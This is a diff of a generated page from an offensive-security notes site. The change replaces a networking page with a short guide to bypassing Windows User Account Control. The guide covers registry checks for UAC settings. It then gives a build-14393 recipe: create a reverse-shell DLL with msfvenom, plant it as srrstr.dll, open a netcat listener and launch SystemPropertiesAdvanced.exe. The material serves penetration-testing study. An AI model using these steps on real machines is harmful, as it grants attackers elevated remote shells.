@@ -12,31 +12,31 @@
         <meta name="author" content="yunniperka">
       
       
-        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Networking/">
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Windows/privilege-escalation/User_Account_Control_%28UAC%29/">
       
       
-        <link rel="prev" href="../Web/attacks/">
+        <link rel="prev" href="../Services_Hijacking/">
       
       
-        <link rel="next" href="../Cloud/">
+        <link rel="next" href="../../persistence/">
       
       
         
       
       
-      <link rel="icon" href="../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>Network Architecture - RedHub</title>
+        <title>User Account Control (UAC) - RedHub</title>
       
     
     
-      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
       
         
-        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
       
       
 
@@ -55,9 +55,9 @@
       
     
     
-      <link rel="stylesheet" href="../stylesheets/custom.css">
+      <link rel="stylesheet" href="../../../stylesheets/custom.css">
     
-    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -81,6 +81,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#user-account-control-uac-bypass" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -93,7 +98,7 @@
 
 <header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href=".." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+    <a href="../../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -113,7 +118,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Network Architecture
+              User Account Control (UAC)
             
           </span>
         </div>
@@ -207,7 +212,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href=".." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+    <a href="../../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -225,7 +230,7 @@
   
   
     <li class="md-nav__item">
-      <a href=".." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   
@@ -249,8 +254,10 @@
       
   
   
+    
   
   
+  
     
     
       
@@ -271,11 +278,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
         
           
           <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
@@ -296,7 +303,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2">
             <span class="md-nav__icon md-icon"></span>
             
@@ -311,8 +318,10 @@
                 
   
   
+    
   
   
+  
     
     
       
@@ -336,11 +345,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
         
           
           <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
@@ -361,7 +370,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_2_1">
             <span class="md-nav__icon md-icon"></span>
             
@@ -379,7 +388,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
+      <a href="../Enumerating_Attack_Vectors/" class="md-nav__link">
         
   
   
@@ -407,7 +416,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/privilege-escalation/Built-in-Groups_Abuse/" class="md-nav__link">
+      <a href="../Built-in-Groups_Abuse/" class="md-nav__link">
         
   
   
@@ -435,7 +444,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/privilege-escalation/Excessive_User_Rights_Abuse/" class="md-nav__link">
+      <a href="../Excessive_User_Rights_Abuse/" class="md-nav__link">
         
   
   
@@ -463,7 +472,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/privilege-escalation/File_System_ACLs/" class="md-nav__link">
+      <a href="../File_System_ACLs/" class="md-nav__link">
         
   
   
@@ -491,7 +500,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/privilege-escalation/Living_off_the_Land/" class="md-nav__link">
+      <a href="../Living_off_the_Land/" class="md-nav__link">
         
   
   
@@ -519,7 +528,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/privilege-escalation/Services_Hijacking/" class="md-nav__link">
+      <a href="../Services_Hijacking/" class="md-nav__link">
         
   
   
@@ -544,10 +553,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../Windows/privilege-escalation/User_Account_Control_%28UAC%29/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    User Account Control (UAC)
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -563,6 +599,48 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-uac-bypass-in-windows-build-14393" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Example - UAC Bypass in Windows Build 14393
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -583,7 +661,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/persistence/" class="md-nav__link">
+      <a href="../../persistence/" class="md-nav__link">
         
   
   
@@ -611,7 +689,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/lateral-movement/" class="md-nav__link">
+      <a href="../../lateral-movement/" class="md-nav__link">
         
   
   
@@ -639,7 +717,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Windows/evasion/" class="md-nav__link">
+      <a href="../../evasion/" class="md-nav__link">
         
   
   
@@ -736,7 +814,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/evasion/" class="md-nav__link">
+      <a href="../../../Linux/evasion/" class="md-nav__link">
         
   
   
@@ -764,7 +842,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/lateral-movement/" class="md-nav__link">
+      <a href="../../../Linux/lateral-movement/" class="md-nav__link">
         
   
   
@@ -792,7 +870,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/persistence/" class="md-nav__link">
+      <a href="../../../Linux/persistence/" class="md-nav__link">
         
   
   
@@ -883,7 +961,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Enumerating_Attack_Vectors/" class="md-nav__link">
         
   
   
@@ -911,7 +989,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/privilege-escalation/Privileged_Groups/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Privileged_Groups/" class="md-nav__link">
         
   
   
@@ -939,7 +1017,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/privilege-escalation/Environment_Variables_Abuse/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Environment_Variables_Abuse/" class="md-nav__link">
         
   
   
@@ -967,7 +1045,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/privilege-escalation/Capabilities_Abuse/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Capabilities_Abuse/" class="md-nav__link">
         
   
   
@@ -995,7 +1073,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/privilege-escalation/Programs_Jobs_and_Services/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Programs_Jobs_and_Services/" class="md-nav__link">
         
   
   
@@ -1023,7 +1101,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Linux/privilege-escalation/Miscellaneous_Techniques/" class="md-nav__link">
+      <a href="../../../Linux/privilege-escalation/Miscellaneous_Techniques/" class="md-nav__link">
         
   
   
@@ -1089,7 +1167,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../AD/" class="md-nav__link ">
+            <a href="../../../AD/" class="md-nav__link ">
               
   
   
@@ -1191,7 +1269,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Web/attacks/" class="md-nav__link">
+      <a href="../../../Web/attacks/" class="md-nav__link">
         
   
   
@@ -1223,8 +1301,6 @@
       
   
   
-    
-  
   
   
     
@@ -1243,15 +1319,15 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="./" class="md-nav__link md-nav__link--active">
+            <a href="../../../Networking/" class="md-nav__link ">
               
   
   
@@ -1270,7 +1346,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_6">
             <span class="md-nav__icon md-icon"></span>
             
@@ -1324,7 +1400,7 @@
         
           
           <div class="md-nav__link md-nav__container">
-            <a href="../Cloud/" class="md-nav__link ">
+            <a href="../../../Cloud/" class="md-nav__link ">
               
   
   
@@ -1368,7 +1444,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Containers/" class="md-nav__link">
+      <a href="../../../Containers/" class="md-nav__link">
         
   
   
@@ -1396,7 +1472,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Virtualization/" class="md-nav__link">
+      <a href="../../../Virtualization/" class="md-nav__link">
         
   
   
@@ -1441,9 +1517,27 @@
 
 
 
-  <h1>Network Architecture</h1>
-
-
+<h1 id="user-account-control-uac-bypass">User Account Control (UAC) Bypass</h1>
+<blockquote>
+<p>UAC bypasses leverage flaws or unintended functionality in different Windows builds.</p>
+<p>The following repository contains many different UAC Bypassing Techniques: <a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a>
+</p>
+</blockquote>
+<h2 id="initial-enumeration"><strong>Initial Enumeration</strong></h2>
+<p>Check if UAC is enabled (0x1=true): <code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA</code></p>
+<p>Check the UAC level(0x5=max level): <code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin</code></p>
+<p>To check the Windows Build: <code>[environment]::OSVersion.Version</code></p>
+<p>Check <a href="https://github.com/hfiref0x/UACME">this</a> repository and see if anything exists for the target build number</p>
+<hr />
+<h2 id="example-uac-bypass-in-windows-build-14393"><strong>Example - UAC Bypass in Windows Build 14393</strong></h2>
+<ol>
+<li>We can basically bypass UAC by placing a malicious <code>srrstr.dll</code> DLL to the <code>WindowsApps</code> folder, which will be loaded in an elevated context</li>
+<li>Generate malicious DLL file:
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=our-ip LPORT=listening-port -f dll &gt; srrstr.dll</code></li>
+<li>Transfer the DLL on the target machine</li>
+<li>Start a netcat listener on the attacker machine: <code>nc -lvnp 4444</code></li>
+<li>Get a reverse shell: <code>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe</code></li>
+</ol>
 
 
 
@@ -1479,7 +1573,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Footer" >
         
           
-          <a href="../Web/attacks/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Different Attacks">
+          <a href="../Services_Hijacking/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Services Hijacking">
             <div class="md-footer__button md-icon">
               
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
@@ -1489,20 +1583,20 @@
                 Previous
               </span>
               <div class="md-ellipsis">
-                Different Attacks
+                Services Hijacking
               </div>
             </div>
           </a>
         
         
           
-          <a href="../Cloud/" class="md-footer__link md-footer__link--next" aria-label="Next: Cloud Platforms">
+          <a href="../../persistence/" class="md-footer__link md-footer__link--next" aria-label="Next: Persistence">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                Cloud Platforms
+                Persistence
               </div>
             </div>
             <div class="md-footer__button md-icon">
@@ -1539,10 +1633,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.sections", "navigation.indexes", "toc.integrate", "navigation.tabs.sticky", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.sections", "navigation.indexes", "toc.integrate", "navigation.tabs.sticky", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
